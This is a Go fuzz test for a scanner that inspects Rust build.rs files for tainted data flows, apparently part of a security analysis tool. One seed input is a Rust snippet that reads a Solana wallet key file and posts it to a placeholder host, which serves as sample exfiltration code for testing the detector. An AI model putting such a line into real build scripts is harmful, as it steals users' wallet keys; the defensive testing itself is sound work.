package rsbuild

import (
	"context"
	"testing"

	"github.com/garagon/aguara/internal/scanner"
)

// build.rs content is untrusted; the taint-binding scanner must stay
// panic-free on arbitrary input.
func FuzzAnalyze(f *testing.F) {
	f.Add("let key = std::fs::read_to_string(\"~/.config/solana/id.json\").unwrap();\nreqwest::blocking::Client::new().post(\"https://x\").body(key).send();\n")
	f.Add("fn main() { println!(\"cargo:rerun-if-changed=build.rs\"); }\n")
	f.Add("let x = \"unterminated\nmacro_rules! broken {\n")

	a := New()
	f.Fuzz(func(t *testing.T, src string) {
		findings, err := a.Analyze(context.Background(), &scanner.Target{
			Path:    "build.rs",
			RelPath: "build.rs",
			Content: []byte(src),
		})
		if err != nil {
			return
		}
		for _, fd := range findings {
			if fd.RuleID == "" {
				t.Error("finding with empty RuleID")
			}
		}
	})
}
